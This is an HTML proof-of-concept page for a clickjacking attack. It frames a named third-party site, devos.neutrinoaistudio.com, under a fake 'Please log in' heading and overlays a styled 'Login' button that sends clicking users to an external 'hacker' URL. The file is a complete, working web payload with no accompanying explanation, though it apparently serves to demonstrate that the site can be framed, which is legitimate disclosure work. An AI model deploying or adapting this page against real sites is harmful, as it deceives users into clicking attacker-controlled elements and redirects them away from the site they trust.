<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>

  <style>
    body{
      margin:0;
      padding:40px;
      font-family:Arial, sans-serif;

      /* GRADIENT BACKGROUND */
      background:
      radial-gradient(circle at top left, #1e293b, transparent 35%),
      radial-gradient(circle at bottom right, #4c1d95, transparent 35%),
      linear-gradient(135deg, #020617, #0f172a, #111827);

      min-height:100vh;
      color:white;
    }

    h1{
      margin-bottom:30px;
      font-size:42px;
      font-weight:700;
      text-shadow:0 4px 15px rgba(0,0,0,0.5);
    }

    .wrapper{
      position:relative;
      width:1000px;

      /* GLASS EFFECT */
      padding:12px;
      border-radius:24px;

      background:rgba(255,255,255,0.05);

      border:1px solid rgba(255,255,255,0.08);

      box-shadow:
      0 20px 50px rgba(0,0,0,0.45),
      inset 0 1px 0 rgba(255,255,255,0.06);

      backdrop-filter:blur(10px);
    }

    iframe{
      width:1000px;
      height:600px;
      border:none;
      border-radius:18px;
      overflow:hidden;
    }

    button{
      position:absolute;
      top:462px;
			width:420px;
      left:300px;

      padding:14px;
			padding-right:50px;
      border:none;
      border-radius:12px;

      font-size:18px;
      font-weight:700;

      cursor:pointer;
      color:white;

      background:
      linear-gradient(135deg,#ec4899,#8b5cf6);

      box-shadow:
      0 10px 30px rgba(139,92,246,0.45);

      transition:0.3s ease;
    }

    button:hover{
      transform:translateY(-2px) scale(1.03);
    }

  </style>
</head>

<body>

  <h1>Please log in to access this feature</h1>

  <div class="wrapper">

    <iframe src="https://devos.neutrinoaistudio.com/"></iframe>

    <button onclick="window.location.href='https://pranx.com/hacker/'">
      Login
    </button>

  </div>

</body>
</html>
